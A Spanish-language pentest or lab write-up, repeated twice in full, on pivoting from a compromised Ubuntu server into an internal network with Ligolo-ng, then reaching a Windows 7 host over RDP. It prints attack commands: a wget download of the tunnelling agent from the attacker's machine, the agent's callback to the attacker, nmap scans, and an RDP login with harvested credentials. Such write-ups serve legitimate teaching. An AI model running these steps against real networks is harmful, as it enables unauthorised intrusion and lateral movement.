# Pivoting hacia la red interna con Ligolo-ng

## Contexto

Tras explotar la aplicación web y obtener una reverse shell como `www-data`, se consiguió escalar privilegios y acceder por SSH al servidor Ubuntu utilizando la cuenta:

```text
dev
```

La validación inicial del acceso se realizó mediante:

```bash
whoami
hostname
hostname -I
```

obteniéndose:

```text
dev
servidor-victima
192.168.1.216 10.10.10.10 172.17.0.1 172.18.0.1
```

La presencia de una segunda dirección IP:

```text
10.10.10.10
```

sugería la existencia de una red interna adicional no accesible directamente desde la máquina atacante.

---

# Identificación de una nueva red

La arquitectura observada era la siguiente:

```text
Kali
192.168.1.165
       │
       ▼
Ubuntu comprometido
192.168.1.216
10.10.10.10
       │
       ▼
Red interna
10.10.10.0/24
```

Por tanto, el servidor Ubuntu comprometido podía utilizarse como pivote para acceder a sistemas internos.

---

# Despliegue de Ligolo-ng

Para evitar utilizar túneles SSH complejos se empleó Ligolo-ng.

## Inicio del proxy en Kali

En la máquina atacante:

```bash
sudo ./proxy -selfcert
```

Ligolo queda escuchando por defecto en:

```text
0.0.0.0:11601
```

---

# Transferencia del agente al servidor Ubuntu

Desde Kali se levantó un servidor HTTP temporal:

```bash
python3 -m http.server 8000
```

En la máquina Ubuntu comprometida:

```bash
wget http://192.168.1.165:8000/agent
chmod +x agent
```

---

# Conexión del agente

Desde la máquina Ubuntu:

```bash
./agent -connect 192.168.1.165:11601 -ignore-cert
```

En la consola de Ligolo del atacante apareció una nueva sesión:

```text
INFO Agent joined.
```

---

# Selección de la sesión

Dentro de la consola de Ligolo:

```text
session
```

Salida:

```text
? Specify a session : 1
```

Seleccionar:

```text
1
```

---

# Creación de la interfaz TUN

En Kali:

```bash
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
```

Comprobar:

```bash
ip a
```

Debe aparecer:

```text
ligolo
```

---

# Añadir la ruta hacia la red interna

La nueva red descubierta es:

```text
10.10.10.0/24
```

Por tanto:

```bash
sudo ip route add 10.10.10.0/24 dev ligolo
```

Verificación:

```bash
ip route
```

Salida:

```text
10.10.10.0/24 dev ligolo
```

---

# Inicio del túnel

Dentro de la consola de Ligolo:

```text
start
```

Ligolo crea un túnel transparente entre Kali y la red interna.

---

# Exploración de la nueva red

Ahora es posible realizar reconocimiento directamente desde Kali.

Comprobación de conectividad:

```bash
ping 10.10.10.20
```

---

# Descubrimiento de hosts

```bash
sudo nmap -sn 10.10.10.0/24
```

El análisis permitió identificar:

```text
10.10.10.10
servidor-victima

10.10.10.20
DEV01
```

---

# Enumeración de puertos

Se realizó un escaneo completo sobre el equipo Windows:

```bash
sudo nmap -sV -Pn 10.10.10.20
```

Resultado:

```text
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
```

La presencia del puerto:

```text
3389/tcp
```

indicaba que el servicio de Escritorio Remoto estaba habilitado.

---

# Enumeración SMB

Se intentó obtener información adicional:

```bash
enum4linux-ng 10.10.10.20
```

o bien:

```bash
crackmapexec smb 10.10.10.20
```

La máquina se identificó como:

```text
Windows 7 Professional
DEV01
```

---

# Acceso mediante RDP

Durante fases previas se habían obtenido las credenciales:

```text
Usuario:
dev

Contraseña:
dev123
```

La conexión se realizó mediante:

```bash
xfreerdp /u:dev /p:dev123 /v:10.10.10.20 /sec:rdp
```

---

# Compromiso de DEV01

La autenticación fue satisfactoria, obteniéndose acceso interactivo al sistema Windows 7.

La cadena de ataque completa fue:

```text
Aplicación web vulnerable
        │
        ▼
Reverse shell (www-data)
        │
        ▼
Escalada de privilegios
        │
        ▼
SSH como dev
        │
        ▼
Descubrimiento de la red 10.10.10.0/24
        │
        ▼
Pivoting con Ligolo-ng
        │
        ▼
Enumeración interna
        │
        ▼
DEV01 (Windows 7)
        │
        ▼
Acceso RDP
```

---

# Impacto

La existencia de un sistema con doble interfaz de red permitió al atacante utilizar el servidor Ubuntu comprometido como pivote hacia una red que inicialmente era inaccesible.

Esta situación constituye un ejemplo clásico de movimiento lateral y segmentación insuficiente de la red.

---

# Vulnerabilidades involucradas

Este escenario se relaciona con varias categorías del OWASP Top 10 y con técnicas MITRE ATT&CK:

## OWASP

* A01: Broken Access Control.
* A05: Security Misconfiguration.
* A07: Identification and Authentication Failures.

## MITRE ATT&CK

* T1021.001 – Remote Services: RDP.
* T1090 – Proxy.
* T1570 – Lateral Tool Transfer.
* T1210 – Exploitation of Remote Services.
* T1021 – Remote Services.
* T1550 – Use of Alternate Authentication Material.

---

# Resumen

```text
Web vulnerable
        ↓
www-data
        ↓
dev
        ↓
SSH
        ↓
10.10.10.10
        ↓
Ligolo-ng
        ↓
10.10.10.20
        ↓
Windows 7 (DEV01)
        ↓
RDP
```
# Pivoting hacia la red interna con Ligolo-ng

## Contexto

Tras explotar la aplicación web y obtener una reverse shell como `www-data`, se consiguió escalar privilegios y acceder por SSH al servidor Ubuntu utilizando la cuenta:

```text
dev
```

La validación inicial del acceso se realizó mediante:

```bash
whoami
hostname
hostname -I
```

obteniéndose:

```text
dev
servidor-victima
192.168.1.216 10.10.10.10 172.17.0.1 172.18.0.1
```

La presencia de una segunda dirección IP:

```text
10.10.10.10
```

sugería la existencia de una red interna adicional no accesible directamente desde la máquina atacante.

---

# Identificación de una nueva red

La arquitectura observada era la siguiente:

```text
Kali
192.168.1.165
       │
       ▼
Ubuntu comprometido
192.168.1.216
10.10.10.10
       │
       ▼
Red interna
10.10.10.0/24
```

Por tanto, el servidor Ubuntu comprometido podía utilizarse como pivote para acceder a sistemas internos.

---

# Despliegue de Ligolo-ng

Para evitar utilizar túneles SSH complejos se empleó Ligolo-ng.

## Inicio del proxy en Kali

En la máquina atacante:

```bash
sudo ./proxy -selfcert
```

Ligolo queda escuchando por defecto en:

```text
0.0.0.0:11601
```

---

# Transferencia del agente al servidor Ubuntu

Desde Kali se levantó un servidor HTTP temporal:

```bash
python3 -m http.server 8000
```

En la máquina Ubuntu comprometida:

```bash
wget http://192.168.1.165:8000/agent
chmod +x agent
```

---

# Conexión del agente

Desde la máquina Ubuntu:

```bash
./agent -connect 192.168.1.165:11601 -ignore-cert
```

En la consola de Ligolo del atacante apareció una nueva sesión:

```text
INFO Agent joined.
```

---

# Selección de la sesión

Dentro de la consola de Ligolo:

```text
session
```

Salida:

```text
? Specify a session : 1
```

Seleccionar:

```text
1
```

---

# Creación de la interfaz TUN

En Kali:

```bash
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
```

Comprobar:

```bash
ip a
```

Debe aparecer:

```text
ligolo
```

---

# Añadir la ruta hacia la red interna

La nueva red descubierta es:

```text
10.10.10.0/24
```

Por tanto:

```bash
sudo ip route add 10.10.10.0/24 dev ligolo
```

Verificación:

```bash
ip route
```

Salida:

```text
10.10.10.0/24 dev ligolo
```

---

# Inicio del túnel

Dentro de la consola de Ligolo:

```text
start
```

Ligolo crea un túnel transparente entre Kali y la red interna.

---

# Exploración de la nueva red

Ahora es posible realizar reconocimiento directamente desde Kali.

Comprobación de conectividad:

```bash
ping 10.10.10.20
```

---

# Descubrimiento de hosts

```bash
sudo nmap -sn 10.10.10.0/24
```

El análisis permitió identificar:

```text
10.10.10.10
servidor-victima

10.10.10.20
DEV01
```

---

# Enumeración de puertos

Se realizó un escaneo completo sobre el equipo Windows:

```bash
sudo nmap -sV -Pn 10.10.10.20
```

Resultado:

```text
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
```

La presencia del puerto:

```text
3389/tcp
```

indicaba que el servicio de Escritorio Remoto estaba habilitado.

---

# Enumeración SMB

Se intentó obtener información adicional:

```bash
enum4linux-ng 10.10.10.20
```

o bien:

```bash
crackmapexec smb 10.10.10.20
```

La máquina se identificó como:

```text
Windows 7 Professional
DEV01
```

---

# Acceso mediante RDP

Durante fases previas se habían obtenido las credenciales:

```text
Usuario:
dev

Contraseña:
dev123
```

La conexión se realizó mediante:

```bash
xfreerdp /u:dev /p:dev123 /v:10.10.10.20 /sec:rdp
```

---

# Compromiso de DEV01

La autenticación fue satisfactoria, obteniéndose acceso interactivo al sistema Windows 7.

La cadena de ataque completa fue:

```text
Aplicación web vulnerable
        │
        ▼
Reverse shell (www-data)
        │
        ▼
Escalada de privilegios
        │
        ▼
SSH como dev
        │
        ▼
Descubrimiento de la red 10.10.10.0/24
        │
        ▼
Pivoting con Ligolo-ng
        │
        ▼
Enumeración interna
        │
        ▼
DEV01 (Windows 7)
        │
        ▼
Acceso RDP
```

---

# Impacto

La existencia de un sistema con doble interfaz de red permitió al atacante utilizar el servidor Ubuntu comprometido como pivote hacia una red que inicialmente era inaccesible.

Esta situación constituye un ejemplo clásico de movimiento lateral y segmentación insuficiente de la red.

---

# Vulnerabilidades involucradas

Este escenario se relaciona con varias categorías del OWASP Top 10 y con técnicas MITRE ATT&CK:

## OWASP

* A01: Broken Access Control.
* A05: Security Misconfiguration.
* A07: Identification and Authentication Failures.

## MITRE ATT&CK

* T1021.001 – Remote Services: RDP.
* T1090 – Proxy.
* T1570 – Lateral Tool Transfer.
* T1210 – Exploitation of Remote Services.
* T1021 – Remote Services.
* T1550 – Use of Alternate Authentication Material.

---

# Resumen

```text
Web vulnerable
        ↓
www-data
        ↓
dev
        ↓
SSH
        ↓
10.10.10.10
        ↓
Ligolo-ng
        ↓
10.10.10.20
        ↓
Windows 7 (DEV01)
        ↓
RDP
```
